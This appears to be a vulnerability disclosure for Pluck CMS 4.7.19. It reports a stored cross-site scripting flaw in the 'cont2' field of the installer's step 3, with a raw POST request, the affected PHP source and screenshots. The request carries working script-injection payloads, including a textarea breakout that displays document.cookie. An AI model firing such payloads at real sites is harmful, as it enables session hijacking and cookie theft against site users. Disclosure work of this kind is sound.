## Target;
https://github.com/pluck-cms/pluck

**Active Version**: 4.7.19

## Vulnerability Information
- **Vulnerability Type**: Stored Cross-Site Scripting (XSS)
- **Severity**: Critical

**Related Code File**: `install.php?action=step3`

**Vulnerability Parametre**: `cont2`

## Vulnerability Description

- During the installation on the system, a security vulnerability was encountered in the homepage area.
- The vulnerability is caused by the `cont2` parameter not being sanitized in a safe manner.
- This allows an attacker to inject malicious JavaScript code to be executed when the page is accessed. 
- A successful exploit can lead to session hijacking, redirection to phishing sites or unauthorized actions on behalf of the victim. 
- It can also be used for social engineering attacks or to spread malware.

## Proof of Content(POC)

- Below is what the `install.php?actions=step3` POST request looks like:

```
POST /pluck-master/install.php?action=step3 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/pluck-master/install.php?action=step3
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=Wb351y8noRVw6yLkJ5Yxv7MObe2EAVqg0zKQljaNWpmXBZD4qP3gr91X6OkJ; PHPSESSID=h84i56vv340jfnnu26qt235921; PHPSESSID=3ravfm034ns8lmfhr96bfmrdq8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

cont1=<script>alert("TITLE3")</script>&cont2=</textarea><script>alert(document.cookie)</script>&save=Save
```

- Source Code View

```
elseif (isset($_GET['action']) && $_GET['action'] == 'step3') {
		$titelkop = $lang['install']['title'];
		include_once ('data/inc/header2.php');

		//Save the homepage.
		if (isset($_POST['save'])) {
			save_page($cont1, $cont2, 'no', '');
			redirect('?action=step4', 0);
			include_once ('data/inc/footer.php');
			exit;
		}
		?>
		<span class="kop2"><?php echo $lang['install']['title']; ?> :: <?php echo $lang['install']['step_3']; ?></span>
		<p>
			<strong><?php echo $lang['install']['homepage']; ?></strong>
		</p>
		<form method="post" action="">
			<p>
				<label class="kop2" for="cont1"><?php echo $lang['general']['title']; ?></label>
				<input name="cont1" id="cont1" type="text" />
			</p>
			<p>
				<label class="kop2" for="cont2"><?php echo $lang['general']['contents']; ?></label>
				<textarea name="cont2" id="content-form" class="tinymce" cols="70" rows="20"></textarea>
			</p>
			<?php show_common_submits('?action=step3'); ?>
		</form>
		<?php
		include_once 'data/inc/footer.php';
	}
```

Page view

![](https://github.com/Speecttre/Asset/blob/main/Pluck_Master/PluckMaster-Install-Step3.png)

View XSS

![](https://github.com/Speecttre/Asset/blob/main/Pluck_Master/PluckMaster-XSS(document.cookie).png)
